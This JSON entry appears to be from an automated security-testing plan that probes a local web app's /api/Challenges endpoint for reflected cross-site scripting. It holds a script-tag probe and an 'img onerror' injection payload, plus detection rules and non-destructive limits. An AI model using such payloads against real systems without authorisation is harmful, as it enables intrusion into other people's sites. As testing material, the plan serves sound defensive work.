    {
      "id": "plan-probe-xss-1",
      "hypothesis_id": "xss-reflection",
      "base_url": "http://localhost:3000",
      "method": "GET",
      "endpoint": "/api/Challenges",
      "parameter": "name",
      "payloads": [
        {
          "tier": "benign",
          "payloads": [
            {
              "location": "query",
              "value": "name=Score Board"
            }
          ],
          "description": "Baseline challenge listing",
          "content_type": "application/json",
          "header": []
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "query",
              "value": "name=<script>1</script>"
            }
          ],
          "description": "Light probe for reflected input in JSON/HTML responses",
          "content_type": "application/json",
          "header": []
        },
        {
          "tier": "exploit",
          "payloads": [
            {
              "location": "query",
              "value": "name=\\\"><img src=x onerror=fetch('http://localhost:3000')>"
            }
          ],
          "description": "DOM-style injection to detect reflection in HTML responses (non-destructive)",
          "content_type": "application/json",
          "header": []
        }
      ],
      "prerequisites": [],
      "oracle_rules": [
        {
          "signal": "reflected_input",
          "condition": "Injected 'name' appears verbatim in response body/HTML fragments",
          "weight": 1.0
        },
        {
          "signal": "response_length_diff",
          "condition": "Body length changes >=20% when injection present",
          "threshold": {
            "body_length_delta_pct": 20.0
          },
          "weight": 0.7
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 10
      },
      "max_retries": 1,
      "delay_between_requests": 0.5,
      "notes": "Perform after enumeration of endpoint content-type. If response is JSON, adapt probes to JSON-encoded strings. Use observed JWT if needed (none required here).",
      "tags": [
        "xss",
        "reflected"
      ],
      "estimated_duration": 30
    },
